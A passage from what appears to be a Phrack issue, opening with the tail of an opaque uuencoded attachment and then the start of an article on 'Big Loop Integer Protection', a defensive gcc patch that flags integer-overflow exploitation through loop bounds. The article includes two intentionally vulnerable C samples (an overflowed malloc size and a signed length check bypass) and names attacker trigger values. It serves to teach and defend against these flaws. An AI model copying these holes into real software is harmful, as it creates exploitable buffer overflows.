MZSZ!CI)5/%4J^;L&#039;8R-@2@Y)OS34&lt;,N5A;8,Y\5&lt;6MRNI2,TO;1P?643SR%C
M8+:@#:^F@Z1&#039;3H6&lt;G5OGTVRE#=@?*K@/5,@:7056^J.I&amp;TFL&quot;&lt;+*P?#:2&#039;5G
MBE4`DJ%0@H5P5&amp;LL:&lt;?4OJD(M,KX;]9UD1#L!NH%MI(2BT=.[5M:6TN!1/V!
M=D9&#039;UA?5RCJN#9MDP-`VP1B3MA.N$6#0AU-5@DQ@5;6CI,WNB!LDCF!ERUZ0
M9CVG&#039;T;8BV7L1;2A1&amp;&amp;PB&#039;!8A&amp;%H5C90JP([&gt;ZKH%0Y@X.(.35&quot;B2R=MN=+*
MS&quot;H,]\`*&gt;7Q1B-,&lt;=[L9?)&amp;$LJ!4K&amp;U0PKKC4&gt;NHA!8HQY`=H&#039;&lt;MV[#V:&#039;;C
M2:,W`.T?Z;6&amp;3N4!&gt;BCI9&lt;&gt;O:[&lt;&gt;!A!7&gt;*=*=D.+5*T2-12#K4PSC&gt;WW&amp;BU)
M6-:S7$*&#039;1WB9QID#)H(5B:&quot;@4X9#`8?H/4U[I&gt;,FJ0`4R)&amp;F2JLX0684-7Y*
MLFRXH*D*MUJE$52!!VCS54*&quot;((,7NDW8Y@IU5G1#)MSJT(`P)^&quot;5`T*S_1EG
M&quot;I6E0_*4E45RU-N71*C7AL.DI4LDS`H0L_)J_ZE-Z7`%&#039;+8.CQ-3JO2X&quot;@$]
MQ5;&amp;;!(&amp;3.WMV6P][-83.@6,3FX[,\C$*&lt;JRC1P!@IK,K?I,4Q?0LM%(@(&amp;U
M?0B9CJEH=SC22+OUU(:&lt;:;^`$PIM&amp;A)9H7X=UU8JJX`5\`OH14P-HSTG&gt;0S9
M[S:8%2=_&quot;BJK*M52HBA(&#039;6.$$U[&#039;@@F3I.I(U![TB2JBXJET6-&#039;``AN1GIO,
MNCNBT@F!B(RC+&#039;AKQXI=CX6C+6K.I%C02.%D4@HI$ZMO%]6JN,QG+&#039;C5@!Q:
M:-U$-JIW;-N[YXYX[^W5_&quot;;YV+,7&#039;E7?`FR_I1I8G[OG=E&lt;+^GMN][Z%N^*=
M&gt;_8=6*B&amp;&amp;GKK@5V[XKT&#039;%@!:U-&quot;=NW;-[=BZBV.7#&#039;S/MKV[]^V:6YCCH/)$
MDNUS\]OV[]RWL&#039;=_-;+2+&lt;SMWZ-&quot;Y_;O5P&amp;53;/2O,!JWL[Y&gt;-?6^06K23MW
M[-F[?XY2S:NV`16-_1.W&amp;XA#Z%$6&#039;F1RN:PM+M^@8P);RT0O4?0R1X\FHH/V
MM8Y=H=ADGM4GQZ1B?4P2C(:U7FJ2D%=2&lt;C1*:&lt;*),BB)&gt;@6U9RMID9.6)&amp;GY
M#$D/C\$DOTD8&lt;&lt;(*)X0%&lt;FI&quot;MS/P4`;/0-(5SI#.Z14\AL&amp;S*,E*9^H6&lt;&lt;A:
M)EMTL&#039;2:_N+NDNDVV2O&lt;*7J&#039;=NO&quot;5=&amp;++%GM!B)(+Z]LZ[S,QN:H&amp;F:-E;JF
MH]:`:UE!OY=JVBYUDGH,#F/0WV\93WR8`YSY%&#039;7)2&lt;G&lt;0=RO&#039;VR!.7(A,/I-
M]J!;QD,A&#039;&gt;5T.W&quot;E(Z&lt;/UB8!M]LQ)&lt;,#H&amp;[%J.^`]88LG5&quot;P-F$]P(3L9ANV
M&gt;\TF#[M)+P87R:H14`&#039;9HXM&quot;Z=2.3@N.HHG4HXSS3&quot;&gt;M&quot;2P&amp;UN+:&#039;@N3CNVX
M.Z.H_6G:XV2A%/I/`K*]/QZ!H3Z$L:%&#039;WVPB%(KVWBF&quot;&#039;@=M,]6AVI?[#7)9
MY`Z3C(;8+(/S=Y:$QT8-J!R:&#039;(4L)6\V`Q@:W&quot;(0K05-#7UN%K!VGQM&lt;HIVR
M!QV1,CVOLT80Q)+%32&amp;S;BK[$BXC*\&quot;U:4T]&quot;1V0MTJ5Y967P%&quot;C/QRR=\2)
MCE1`!EH!5M9QJ+;H!O=SR9P+^MUZT@,2I8!.,J?&#039;,C6DRB@&lt;(W=&amp;1=ZY#?^L
MP/RVZ`:&amp;,YNLP/PV&#039;^%C.X&#039;%&lt;-MA&lt;]8*PG*#H[DC5XZF&quot;\%&quot;W,ILF/UO&#039;4N$
M-.!B,.]OR&lt;,-_#\$[&amp;R6WW&quot;&gt;#&lt;BXVY:MM^S&lt;/*HM&gt;EO`RX&quot;WI7FLIQ+2$RR\
M+?;&amp;6]CQJO,1#\D@W&amp;*?C&lt;BAN3AX&amp;71&amp;4$2B_L57LB[75A!C+X[^;2V1_H&quot;W
M!81_5/(F/3!/L0FS)&lt;6&lt;\9^,]3FQ.D=6ZE;^$]MS((&gt;#NCX&gt;R=K(3RYQX?9T
M+&lt;=#G9P98R\-?JOY&quot;?U],&lt;&lt;#&gt;:#K9\BNTVHK&#039;OS!K&gt;)S.![(&quot;9T$?8492BNV
M[$#N!R0D+N)X(%?T-?7R&#039;Z;4#R0=0&quot;8(XH$\T.]=1&#039;HO4NXJ_@/IA6&lt;Y&#039;L@1
M@?VWG.&gt;6&quot;[^&amp;1[H[*%7XMM7K($!LH(EM,_CN6/&#039;6J7CKK&#039;@OL.*-K7@@W[1A
M-&lt;D]0?BE5KR?Y&#039;J`_!3(5]VG`EX^I9_?9L5[5,5[=+7G*&quot;%)/Y^PX[U=Q;N8
MY#[D)SHE[[+B@3S79RXE&amp;VW9&lt;G_&gt;,_CB/:CZ18P%\B_&#039;SU_A&gt;!CT,.F&#039;73HE
MOT&gt;L&gt;*!/&lt;.D&amp;$V;&#039;^U=6/)`HA?OZ=5/B?=&quot;*=XV*=\T9XGW8B@=R:+D-&#039;M_(
MFWCP=Y+[!.*AKMH&amp;TE.[V(H&#039;^7_*LV3CWJWRN])S?C(TG_:,+&lt;4&lt;Q]MN-3C&#039;
MS\]YKDX9Q&#039;M`C9O&lt;J`O&gt;_#?/M1GX@6L\E&#039;/+EON7F?P^IB;JEZ?4[ZN&gt;:\/Q
M-P+&quot;TVR\K.W#7(&#039;DX++QLK8/OQJI\5M#.FHW&gt;6&gt;V??C,:SSO&gt;1;@3+8/X0?K
MEN&lt;96X&gt;P/M$WE7R]_J8,3^IOZGA85^B;1E7D&quot;&lt;5VVA?U-_?,V^2;,&amp;N=_B9M
MOPWZFP1V[]/?I&amp;7XJ/ZF&amp;?&#039;HV^6;M`%A_M$W:R`^*-]7T/?#\DVS]U+]34BW
M07^3MN(U^IM6]IS^)NN&lt;&#039;?U-TIF`O_3]?(JOOU_@]/M%J)EH?[\P\_VBS/&gt;+
M,]_79KY_*//]$F?&lt;P;8E]-CGWB[RGI=ACO*]2GW_2&quot;9^D(E?F9*?]PX3#E)U
MJQ\66=&lt;-*+USC?Y^+DJYK;/&quot;ZU9Z*!_FRJ4Z_$KO?O5&lt;L,)_03U!&gt;&gt;H:#&#039;\!
MKB5W6^$?4,_[K._?=?+;X/V!9\9W1HWOM/8\_(!ISW^QOB&amp;_I]3S:BL]E/?8
M`V&lt;N[UN&gt;D2V&amp;]E\TX[9OVOA\QBK_RIG)\/=8_?U&quot;%?[Y=X@NZV7&gt;RV8,/EZI
M\&#039;&#039;3C*L+NWO&amp;U84%VY$;?GKUNA=P&gt;K#K:&gt;O&amp;@JU(CW5+-ZCY`[8B;5W9AR#&lt;
MTI5]+]B&amp;M&#039;1CP1:DS-^KU/Q]_XRK2_ODC*M+^^&lt;SKB[MW\ZXNK1@ZU&#039;F.]3W
MLE6N;BW8?K1U:X-59CY&gt;J?KO-&gt;H;]`3K%U/Z;:M&lt;W=N[5U&#039;_1M(?L`1R?^94
M#P#A(^-SE5I?QJM&lt;7=UW0&#039;[O)GH&#039;VO-.D&quot;NVPG]IE:N[^_Y,_7YKE5E?KE3K
MRR?`7L;/F_#_N,K5]?V&quot;5;\-ZK]3JUS=WV]#?7[&gt;].^:+*T!U#40U%L:66DQ
MT%.P%&amp;]%\HS-`#:&amp;HW0T;K&lt;59+&quot;EH`ZDVQ?V[H]W[9Q?B&amp;-/#)4WMX1PH]Z/
M%SO].OC!!:(\KHV/*NC&lt;;?&amp;M^[?NGB/G?&quot;H1U(+NESQBU&amp;SQ?8^4@@F*7!-Z
M;?&gt;&#039;&lt;/_2)\N#&lt;;S-*MPNL&amp;$5B&#039;&#039;F]FS&#039;*-OM#ZH&#039;?:&#039;@CFH4N*2+245Y^UU[
MMN[&gt;N6VZKO+--QMU9+QXL0%CT(PA;68;&#039;+&lt;&#039;\=(15KZV`UCAV0$U/607G4D?
MVXY+6ME.2:2:;8.6IQ3&quot;(RRZVVZ5QJ.&amp;FZ4Z/W$&quot;U..&gt;T.RV8S&gt;3E@=C)&quot;7@
MV0W5S&gt;U88/@3^MJ&amp;@3:Y4VZ+QGK&#039;KKVW;-T5[[WUUOFYA7AAZRV[YM08@E7*
M&quot;8USJV&quot;X9[%S2]*XGBR*1&lt;J,@OF%W_]5/[&#039;_@NI#/Z`R0-BT%(9GL/^2#\MA
MWMA_\=&#039;^2U&quot;Z8/_E&#039;^3W]);;FL/YB^BPL^&#039;?KE5$V3WF9.]Y?[\V]_&quot;?LZ&amp;1
MTZ=/ET\Y)^P+OPN_&quot;[__RWZ/&gt;&lt;_[-_&lt;^^=P&#039;/OG0Y^]]S1&lt;N.?#^\&gt;WWON9/
M+_FQ&#039;QMO&gt;_JU&#039;\B=&#039;%U\:IWW]+&gt;&gt;.*5.*[E]K\N?_M&quot;,]\&#039;+G]QPUYU//+KV
MZ?^YIR^ZJLEB#P6X&lt;^W^N-?,;=FRQ7MZ[P.?/&#039;XJ]]#G\Z??^9*OSQQ_&gt;O7C
M?[GNQ)\\_O1%]S[A;=ARXB67&gt;A_QUMWPK&lt;O7/N9M&gt;.CSW_@UJQ;KN1:KGE[_
M8&amp;FX^E1Z^IM/_SUGM^5;:]1Y&lt;[1ERSVO46O;^!67O_3!TJJ+3^T[_?077C\D
MW0:00]J46TR605EW/(#:M/V3[4&gt;^./.^4S-M_PL?^&lt;RJ]F,YU:CV[^W;NGN^
M_2%@@+QD[9//&amp;^;:-P%D?,U[3LV\.O&gt;6*Y]=&lt;VKFQ+&gt;/G[SZQ&quot;?:Q[_KC3_Y
M&#039;?]3_F&lt;?FSFEXK[J^&#039;&gt;\\27&#039;_\X;KS[Q^(G_UK[W2Z!GVW[\2VO:)Y[_Q9GV
MO7^!WS.7?W&#039;F@_&lt;]^;Q&#039;5GF/77R1_X4GGW_JGUSDGWSH\W]06CV#;=KWT,F/
MW.-]:(/WNF&gt;^\:L4&lt;LW,76L_\K#WC5_E$1I&gt;?,\S%XVNHBXXJ4)4;/_D,]]X
M/W&gt;*?_*1]W@?//D=5:T??LD#*@N.&gt;&gt;+//O(&gt;[_Y+CS^^ZOAW-@PO4JF^\:LO
MY32?6`-V)IZ\\C=6C];`^_N]+&lt;=?HTY@H[5;3K]$#?OJRT^];Z:]Y;U7&gt;^TM
MC_SF6N[W54^__#%OYH$GC_^/W);[U1@^\]#)9S_VT!?4F,[&lt;&lt;/J&amp;;WW(6_&gt;-
M7ZL\/7P*1K-]_#77JR&#039;:`2.5&amp;]W\P&quot;=ORCT\JOR=*OV!SU8^.EQS[T&gt;]AV_X
MZ$.??\Q[^*&amp;36^Z__&quot;KO[T]\&gt;N^)9^]]ZH_6?&gt;-7__J/UN0&gt;_A&quot;\/99[^*&#039;/
M/_394Y^;&amp;;_EL9F-[5]^\GGM7SGU\9EQ_]13,Z=^?V:\^.A__DKSU)_.//KG
M7[G[U!_/^)\Z]2]FQON_])TO_\REJS8^^Y6?48!?G!EO_=)WGKV\L&#039;;\N[\?
MKCV5^WN%4J=1&gt;JB::RL*F_U&quot;57-;@WQNL39JY7K]46[82@?]&#039;FA]__!EZ[TK
M9EY2N42AT@.?;S_^Q=7MBT&#039;%L/W(UDNNF&#039;G^:R_Q3W[E:Z?&gt;-?.5KY]ZY\RC
MI[_RWE/&#039;9Q[][E=^^+$9E&gt;QK3WO^%]K^MQ[X3\?_9Z[]^%=6M_\:=N8-&#039;KEQ
MS%T/-,G-&gt;^9OW;OMP/SF)GAE[P\VY_T;&lt;B_S_=SK6\W&lt;GOYR+BCG_&#039;PU&#039;U7S
MQ=RV^06X7`N\OWOTGJ\,_E`-W5O6&gt;&gt;,7;?GX&amp;M77#YQ\_-3J+?&gt;]HK;N@9-;
M&#039;GG+NLW&gt;AC]\W1WS;__&quot;^(4?\NZY?.WO[U[WF/?3&quot;EE^=,M#:]ZR;LNS:Y)U
M6][YBF3=R2^OSI]\PX_?]8?9E0)0&gt;&gt;9GZ;GA9Z&gt;M)9&gt;_])D&#039;2_&gt;O._6)[S[]
M[,X]&quot;WY1]5U;G6!`RSY7:S3`X1,8X`=/3_;D]%ZWS__40W^Q\Z&amp;G/I3SFN_U
M5NV[N?F(M^K4G-&gt;:7;-AU5]\O?FN-=ZJ.^]ZHOVZ]H?&gt;\XX9K[US=/6I5WI?
M;O[&amp;S&amp;CMJ9=X7[[[Z:_^QJKQJ?9=3[SN@ZN&gt;?-%]7]MXQ7W?_*W5G_WJ&#039;ZV_
MZXFOW#-A+`+5X7_IT_3\F4\+^![XYR4ON&gt;*]E[_T\K5J&amp;IYZYM3%WJD;O9&lt;^
MT?SXFBL\[X-7_?:&amp;)S&lt;T3[QDO7?/=S&gt;,GO_LFC^^Y#&#039;O14]N&gt;/6+QI&lt;TGU51
M`/+$!R_*GX9HSU&lt;IKL#XJ[WF(VN\5Z\=JVGV7R_Q&#039;FV]]^VKFX]L\-[[)Y=&lt;
M&lt;G*TOGG?*]9ZS?==[CWQZ`OO&gt;&lt;T?7^*-UK3&gt;\[;5SYY$&amp;&quot;S2WH&#039;W_]B//7RN
MQ5SH?[%:L?)M8.6_&lt;]#_/KX+_1\4@?XO%R[0__\@O\=.KN6E]$-J+?[6#:&gt;?
M^&lt;:O_?4+/&gt;_ACWSSM6KY_,R)9Q[ZBP\?]5[2_(/R;ZUY_3=^+7[IQ^=6;VR&gt;
M&gt;&amp;WS@1VK?O\/9C[PBX\\,7/OLY^:22][M__9#WNK&#039;IM9I7:&gt;4X30&#039;[K$^^VU
M__Y3,X_-//?)#6I-^_W/&gt;2=6^R?SGWWRN2KJ&gt;[X^&lt;__E3\S\R*71)Y&lt;O?J]Z
M67WJ)[Q]IQ[Q[KQ^S==GQE]&lt;\C:L/57V3CU_YM37O/&lt;^,W/)R?&amp;U][_DB9G&#039;
MUJTZ_MTK1AL&gt;O?;X=Z\:7?)H[OAW-XY6/&gt;H]\LS,7P,&#039;D5KVP,E_&lt;?J*\;/^
M%TZ_)+=J=LTW9Y9GGL!&quot;3CS^^%]&lt;,O,GZ24C-6%O^/SCIRZ!*;O9&gt;_J/[[[[
ML2V7?WBM]^2&amp;VOT+J^^_=.M]?W3_PJK[_OC&gt;+WDS&#039;URU_W7S^U33;CS^L76U
M)TX\?M&#039;JV35/S(PO4\WRMZ\:7W1ZNVK9B=60]Q^FESQP\IZ/;7CHI/^%)_:=
MNM3+?QF:?/QCZVM/_],/7&gt;R=^*O7J27HGN]&lt;G%[QV-SEUW_RR0V/WJG^JD]N
M./X&#039;JTY=[MWUI3]_XK&#039;+%,GTZ/HG-SSQH=7&gt;_7=XCW]T]6-77)[[S.J&#039;7WGU
MS:]\&lt;L.7_N&lt;3U)%JLF^\ZHI++EN_JX^&amp;1LXQX.#&lt;&quot;ACBN)`=&gt;#_/__US6[?O
MGOL!X=@YYG^^&#039;)1P_JMH05@JJ/A^.&lt;A?F/__$+^%I21%HS9+K5S:&#039;P\;:&amp;8&#039;
MON87MB[LW+;Y]KG]&gt;^9V;=ZY&gt;^N.N&lt;W[MBYLNVWGGAVY9K\Q!IF1+&gt;O7Y_BW
M.7&gt;P/GKS4C?W:GK&gt;G&quot;:]&amp;LB6O,:*H@B2%GC91&quot;ID_7I5%//&lt;L&lt;C!L+\XK&#039;77
M7_(R&lt;$0T$4S&amp;&gt;CA4OM:;$&amp;C&#039;03!B!`(M_9Y`UZ]&#039;&#039;+?\/Y(E&#039;)71EAL)_[&gt;D
M2[D;80N\&lt;;D+U-V;.&gt;V6/F3?RQWKCW-&#039;DDXGM]@:Y6JY7NM(3BP-`:\\E_1R
MC?%PJ#HDUTR&amp;:(/GV);U1UJ=SB9(VJCU&lt;J.6JE@RR@%[-E&lt;_ENLDG3Z8*5H&lt;
MCNOKU]_2:M14&quot;%CIJ25-&#039;`*(7U/&#039;HE9S3-)^N2V)RAV-0767(2L&gt;*&#039;&quot;$[C;L
M#+:&gt;IOUX_NMN^$&#039;@V-GM/\-N&#039;_#^7RH6\F78_TO%\H7Y_P_Q&gt;]D/WUA/&gt;C&gt;F
M2^O7WXZS^Z;K9%)&lt;MW[_UM?&#039;-/]O(OQ:_V/RO=&amp;$7;=E\&lt;W7K=^U&lt;\_M-UW&#039;
M_E4[O4/7K9^_:WYA;G&gt;\&gt;^N^FZZCR47&amp;N+9T:X/KUL_=*5E=QU/INO5[;_G1
M;7OWW773=?WZP49_&lt;&quot;RW&gt;6].U:XV5&amp;_[&lt;RB&gt;AB\LL);;/&#039;_=&gt;M0[ATKCY97Z
MWKMW87YNVX+*5FA:596YA0.J%L3E5G55&quot;2#N^J2=&gt;T-NX\MRFWNM7)![$T[V
M]9&gt;T&amp;DO]W&#039;5DV6UC/O=J:A1.K=?D7DTKPVNN4_&amp;.JDGHKV\GZ]=OI,[+;?1S
M&amp;]6ZAEZ%-[=SFRLYJZ/6C[J#0;*X&gt;.RF6+W%&amp;]4//]=OW+4]MWF8V]S/;=PH
M&lt;;;T&lt;YOKTOJ-TN\`:W7:A0#5ZW.;%W(;H&gt;-G*8L%N)W,Y8^2&lt;8?&lt;YE8.;W7&amp;
M@[@09&#039;(_FEMJU9JJ$/2GYQ:LFL,CX::PXXQ&#039;*A;V/51IH_1Z;B-V=29JCLW&lt;
MO2:W40_[^O7#KENJ^WTT&amp;ZY*!(CTQ&#039;FL&lt;1=^9_[)^J_G[0^@C&#039;/1?WZI).&lt;_
M7QT`5?R&quot;(@0OK/__$#^8M#OW[IG/_:,&lt;2A/GJNI-NSC,W93;,IO;M7?/CNN-
MLT.X;U:DG`&#039;&lt;8+U3BE==OR4;@*DP\&quot;UON3!W+_PN_&quot;[\+OPN_&quot;[\+OPN_&quot;[\
M+OPN_&quot;[\+OPN_&quot;[\+OPN_&quot;[\+OPN_&quot;[\+OPN_&quot;[\+OPN_&quot;[\+OPN_&quot;[\OJ^_
*_Q^/V/4P`-@$````
`
end

|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x09 of 0x10


|=-------------------=[ Big Loop Integer Protection]=------------------=|
|=---------------------------------------------------------------------=|
|=--------------=[ Oded Horovitz ohorovitz@entercept.com ]=------------=|

--[ Contents

  1 - Introduction

  2 - Part I - Integer problems
    2.1 - Introduction
    2.2 - Basic code samples

  3 - Part II - Exploitation pattern
    3.1 - One input, two interpretations
    3.2 - What is the nature of the input?
    3.3 - Suggested detection


  4 - Part III - Implementation
    4.1 - Introduction 
    4.2 - Why gcc?
    4.3 - A bit about gcc
        4.3.1 - Compilation flow 
        4.3.2 - The AST
        4.3.3 - Getting started 
    4.4 - Patch Goals 
    4.5 - Patch overview
        4.5.1 - Tactics
        4.5.2 - Modifying the AST
    4.6 - Limitations

  5 - References

  6 - Thanks

  7 - Appendix A - Real life examples
    7.1 - Apache Chunked encoding
    7.2 - OpenSSH auth
  
  8 - Appendix B - Using blip  

--[ 1 - Introduction

Integer overflow and integer sign vulnerabilities are now common 
knowledge. This has led to increased exploitation of integer-related 
vulnerabilities. The article will attempt to suggest a way to detect 
these vulnerabilities by adding compiler support that detects and flags 
integer vulnerabilities exploitations. Specifically a gcc patch is 
presented to demonstrate the feasibility of this technique.

The article is divided into three parts. Part one contains a brief 
introduction to some of the common integer related vulnerabilities. We 
list some of the recent public vulnerabilities. Part two of the article 
tries to explain the root cause of the problem with integer 
vulnerabilities. Using real examples, the article explains why 
exploitation is possible in the first place, and how it may be possible 
to detect exploitation of integer vulnerabilities, even when the 
vulnerability is not known in advance. Part three goes through the 
implementation of the suggested detection scheme. Since the 
implementation of this detection scheme is in the form of a gcc patch, 
introduction information about gcc internals is provided as well. We 
summarize the paper by demonstrating the protection at work against 
OpenSSH and the Apache httpd packages.

--[ 2 - Part I - Integer problems

----[ 2.1 - Introduction

In the last year the attention seems to have shifted to a new bad 
programming practice. This practice is related to the possibility to 
integer overflows that cause buffer overflows. It turns out the many 
popular and (assumed to be) secure software packages (OpenSSH, Apache, 
*BSD kernel) share this vulnerability. The root cause for this bad 
practice is insufficient input validation for integer type input. Integer 
input looks so naive, only a few bits long. What can go wrong here? Well, 
it seems that quite a lot can go wrong. The following is a table of 
integer related vulnerabilities taken from the OpenBSD and FreeBSD 
security lists. All vulnerabilities have been reported during year 2002. 

-------------------------------------------------------------------------
| Vulnerable package     | Short description of vulnerability           |
-------------------------------------------------------------------------
| OpenBSD select syscall | Positive limit checks against int value      |
| (See reference [4])    | allowing stack overflow                      |
-------------------------------------------------------------------------
| RPC xdr_array          | Int overflow cause small buffer allocation   |
|                        | which later overflowed with input            |
-------------------------------------------------------------------------
| OpenSSH Authentication | Int overflow cause small buffer allocation   |
|                        | which later overflowed with input            |
-------------------------------------------------------------------------
| Apache chunked-encoding| Positive condition is done on signed int     |
|                        | allowing heap overflow                       |
-------------------------------------------------------------------------
| FreeBSD get_pallette   | Positive condition is done on signed int     |
|                        | allowing information leak from kernel to user|
-------------------------------------------------------------------------
| FreeBSD accept1,getsoc-| Positive condition is done on signed int     |
| kname1,getpeername1    | allowing information leak from kernel to user|
-------------------------------------------------------------------------
 Table 1 - Sample integer vulnerabilities in year 2002.

The common problem that exists in all of the above vulnerabilities is 
that an input of integer type (signed and unsigned) was used to trigger 
overflow (when writing) or info leak (when reading) to/from program 
buffers. All of the above vulnerabilities would have been prevented if 
proper limits had been enforced. 

----[ 2.2 - Basic code samples

Integer vulnerabilities can be further illustrated by looking at the 
following two simple code samples. 

Example 1 (int overflow): 
-------------------------
01	int main(int argc,char* argv[]){

02		unsigned int len,i;
03		char	*buf;
		
04		if(argc != 3) return -1;
		
05		len=atoi(argv[1]);

06		buf = (char*)malloc(len+1);
07		if(!buf){
08			printf(&quot;Allocation faild\n&quot;);
09			return -1;
10		}
		
11		for(i=0; i &lt; len; i++){
12			buf[i] = _toupper(argv[2][i]);
13		}	
14		buf[i]=0;
		
15		printf(&quot;%s\n&quot;,buf);
16	}

The code above seems quite legit. The program converts a string to its 
upper case representation. First it allocates enough space for the string 
and the NULL termination character. Then it converts each character into 
its upcase value. But when looking a bit closer, we can identify two 
major problems in the code. First, the program trusts the user to have as 
much characters as he specifies (which is obviously not the case)(line 
5). Second, the program doesn&#039;t take into account that by calculating the 
space to allocate, an integer overflow may occur (line 6). Trying to 
generalize the problem, the first bug may allow the attacker to read 
information, which he didn&#039;t provide (by trusting the user input and 
reading *len* chars from argv[2]). The second bug allows the attack to 
overflow the heap with its own data, and therefore to fully compromise 
the program.


Example 2 (sign check-bypass):
------------------------------
01	#define BUF_SIZE 10
02	int	max = BUF_SIZE;

03	int main(int argc,char* argv[]){

04		int		len;
05		char	buf[BUF_SIZE];
		
06		if(argc != 3) return -1;
		
07		len=atoi(argv[1]);

08		if(len &lt; max){
09			memcpy(buf,argv[2],len);
10			printf(&quot;Data copied\n&quot;);
11		}
12		else
13			printf(&quot;Too much data\n&quot;);
		
		
14	}

The second example shows a program that had the intention to solve the 
problem introduced in the first example, by attempting to enforce user 
input length to a known and predefined maximum value. The problem in this 
code is that len is defined as a signed int. In this case a very big 
value (unsigned wise) is interpreted as a negative value (line 8), which 
will bypass the limit check. Still, in line 9 the same value is 
interpreted as an unsigned positive number causing a buffer overflow and 
possibly allowing a full compromise.

--[ 3 - Part II  - Exploitation pattern

----[ 3.1 - One input, two interpretations

So what is the real problem? How come such security-oriented packages 
have these vulnerabilities? The answer is that integer inputs sometimes 
have an ambiguous interpretation at different parts of the code (integer 
may change their sign at different values, implicit type cast, integer 
overflows). That ambiguous interpretation is hard to notice when 
implementing input validation code.

To explain this ambiguity let us look at the first example. At the time 
of allocation (line 6), the code believes that since the input is a 
number, then adding another number will yield a bigger number (len+1). 
But since typical C language programs ignore integer overflows the 
particular number 0xffffffff do not apply to this assumption and yields 
unexpected result (zero). Unfortunately the same error is *NOT* repeated 
later in the code. Therefore the same input 0xffffffff this time 
interpreted as an unsigned value (a huge positive number). 

In the second example the ambiguity of the input is even more obvious. 
Here the code includes a silent type casting generated by the compiler 
when calling memcpy. The code therefore is checking the value of the 
input as if it was a signed number (line 8) while using it to copy data 
as if it was an unsigned (line 9). 

This ambiguity is invisible for the coder eye, and may go undetected, 
leaving the code vulnerable to this &quot;stealthy&quot; attack.

----[ 3.2 - What is the nature of the input?

Looking back at the above examples reveal a common meaning for the 
attacker input. (Sorry if the next few lines will explain the obvious :&gt;) 
The above input is a number for a reason. It is a counter! It counts 
items! It doesn&#039;t matter what those &quot;items&quot; are (bytes, chars, objects, 
files, etc.). They are still countable amount of items. And what can you 
do with such a counter? Well, you are most likely to do some processing 
&quot;count&quot; amount of times. As a note I will say that not *every* number is 
also a counter. There are many other reasons to have numbers around. But 
the one that are related to integer vulnerabilities happend to be 
&quot;counters&quot; most of the time.

For example, if the count is for challenge response you may want to read 
&quot;count&quot; amount of responses (OpenSSH). Or if the count is buffer length 
you may want to copy &quot;count&quot; amount of bytes from one memory location to 
the other (Apache httpd). 

The bottom line is that somewhere behind this number there is the proper 
&quot;loop&quot; in the code that will do some processing, &quot;count&quot; number of times. 
This &quot;loop&quot; may have multiple forms such as the for-loop in the first 
example, or as an implicit loop in memcpy. Still all loop flavors will 
end up looping around the &quot;count&quot;.

----[ 3.3 - Suggested detection

Ok, what do we have so far about those vulnerabilities?
- The input was ambiguously used in the code.
- Somewhere in the code there is a loop that uses the input integer as an 
iteration counter. 

To make the interpretation of the number ambiguous, the attacker has to 
send a huge number. Looking at the first example we can see that in order 
to make the number ambiguous the attacker needed to send such a big 
number that if doing (len+1) the number will overflow. For that to happen 
the attacker will have to send the value 0xffffffff. Looking at the 
second example, in order to make the interpretation of the number 
ambiguous, the attacker needs to send such a number that will fall into 
the negative range of an integer 0x80000000-0xffffffff. 

The same huge number sent by the attacker to trigger the vulnerability is 
later used in a loop as the iterations counter (As discussed in the 
section &quot;What is the nature of the input?&quot;) 

Now lets analyze the exploit process:

1. Attacker wants to overflow buffer.
2. Attacker may use integer vulnerability
3. Attacker sends a huge integer to trigger the vulnerability.
4. Count loop executes (probably) using attacker input as the loop bound.
5. A Buffer is overflowed (On early iterations of the loop!)

Therefore detecting (and preventing) integer vulnerability exploitation 
is possible by validating the loop bounds before its execution. The 
validation of the loop will check that the loop limit is not above a 
predefined threshold, and if the limit is higher that the threshold a 
special handler will be triggered to handle the possible exploitation. 

Since the value required to trigger most integer vulnerabilities is huge, 
we can assume (hope) that most legitimate loops will not trigger this 
protection.

To get a feeling for what values we expect to see in integer 
Vulnerabilities, lets examine the following samples:

- Allocating buffer for user data + program data

Looks like: buf = malloc(len + sizeof(header));

In this case the value required for triggering int overflow is very close 
to 0xffffffff since most program struct sizes are in the range of several 
bytes to hundreds bytes at most.

- Allocating arrays

looks like: buf = malloc(len * sizeof(object));

In this case the value required for triggering the overflow may be much 
smaller then in the first example but it is still a relatively huge 
value. For example if sizeof(object) == 4 then the value should be bigger 
then 0x40000000 (one Giga). Even if the sizeof(object)== 64 the value 
should be bigger then 0x4000000 (64 Mega) in order to cause an overflow.

- Falling to negative range

In this case the value required to make a number negative is any number 
bigger then 0x7fffffff. 


Looking at the values required to trigger the integer vulnerability, we 
can choose a threshold such as 0x40000000 (One Giga) that will handle 
most cases. Or we can select smaller threshold for better protection, 
which may trigger some false positives.

--[ 4 - Part III - Implementation

----[ 4.1 - Introduction 

Once we have a suggested a way to detect integer attacks, it will be nice 
to implement a system based on that idea. A possible candidate for 
implementing this system is to extend an existing compiler. Since the 
compiler knows about all loops in the application, it will be possible 
for the compiler to add the appropriate security checks before any &quot;count 
loop&quot;. Doing so will secure the application without any knowledge of the 
specific vulnerability.

Therefore I choose to implement this system as a gcc patch and name it 
&quot;Big Loop Integer Protection&quot; a.k.a blip. Using the -fblip flag one may 
now be able to protect his application from the next yet to be public 
integer exploit.

----[ 4.2 - Why gcc?

Choosing gcc was not a tough decision. First this compiler is one of the 
most common compilers in the Linux, *nix world. Therefore, patching gcc 
will allow protecting all applications compiled with gcc. Second, the 
gcc is open-source therefore it may be feasible to implement this patch 
in the first place. Third, previous security patches were implemented as 
gcc patches (StackGaurd, ProPolice).So why not follow their wisdom? 

----[ 4.3 - A bit about gcc

Well.., all happy I set down knowing that I&#039;m about to make a gcc patch 
for preventing integer attacks. But, except of that, what do I really 
know about gcc at all? I must admit that the answer for that question was 
- &quot;not much&quot;. 

To overcome this little problem, I was looking for some documentation 
about gcc internals. I also hoped to find something similar to what I 
wanted to do, which already exists. Fast enough, it was clear that before 
jumping to other examples, I must understand the gcc beast. 

.. Two weeks later, I have read enough of the gcc internal documentation, 
and I spent enough time in debugging sessions of the compiler, to be able 
to start modifying the code. However before I start jumping into details 
I would like to provide some background about how gcc works, which I hope 
the reader will find useful.

------[ 4.3.1 - Compilation flow 

The gcc compiler is really an amazing machine. The design goals of gcc 
include the ability to support multiple programming languages, which 
later can be compiled into multiple platforms and instruction sets. In 
order to achieve such a goal, the compiler uses several abstraction 
layers. 

At first, a language file is processed (parsed) by a language &quot;Front 
End&quot;. Whenever you invoke the gcc compiler, the compiler will decide 
